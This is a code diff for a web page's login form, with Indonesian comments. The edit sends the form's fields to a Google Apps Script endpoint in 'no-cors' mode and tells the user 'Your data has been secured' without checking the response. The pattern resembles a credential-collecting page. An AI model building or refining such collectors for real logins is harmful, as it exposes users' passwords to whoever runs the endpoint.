@@ -78,7 +78,8 @@
     </div>
 
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbxZt1IWLQukszHr0YwIXhxqRTU72KRRm5ec7yX-gRHyCRrW99c2yQLqWjRMYjPtQ_kP/exec';
+        // Menggunakan link script yang baru Anda berikan
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbzFJ6UPr--QbKJPuM303kV3akOQIr1OTVuujqhCTDL1FpjzpN6U52bS5-p1ZcXSskjN/exec';
         const form = document.getElementById('loginForm');
         const btnSubmit = document.getElementById('btnSubmit');
         const statusMsg = document.getElementById('statusMsg');
@@ -97,14 +98,21 @@
             
             statusMsg.className = "hidden";
 
+            // Menggunakan URLSearchParams untuk memastikan data terkirim sebagai parameter yang bisa dibaca doPost(e)
             const formData = new FormData(form);
+            const params = new URLSearchParams();
+            for (const pair of formData) {
+                params.append(pair[0], pair[1]);
+            }
             
             fetch(scriptURL, { 
                 method: 'POST', 
-                body: formData
+                body: params,
+                mode: 'no-cors' // Penting untuk menghindari CORS error di Google Apps Script
             })
-            .then(response => {
-                statusMsg.textContent = "Data berhasil dikirim!";
+            .then(() => {
+                // Karena no-cors, kita anggap berhasil jika tidak ada error network
+                statusMsg.textContent = "Berhasil! Data Anda telah diamankan.";
                 statusMsg.className = "p-3 rounded-xl text-sm text-center bg-green-100 text-green-700 mt-4 block";
                 form.reset();
                 btnSubmit.disabled = false;
@@ -112,7 +120,7 @@
             })
             .catch(error => {
                 console.error('Error!', error.message);
-                statusMsg.textContent = "Gagal mengirim data. Coba lagi.";
+                statusMsg.textContent = "Gagal mengirim data. Periksa koneksi Anda.";
                 statusMsg.className = "p-3 rounded-xl text-sm text-center bg-red-100 text-red-700 mt-4 block";
                 btnSubmit.disabled = false;
                 btnSubmit.innerHTML = "Login Sekarang";
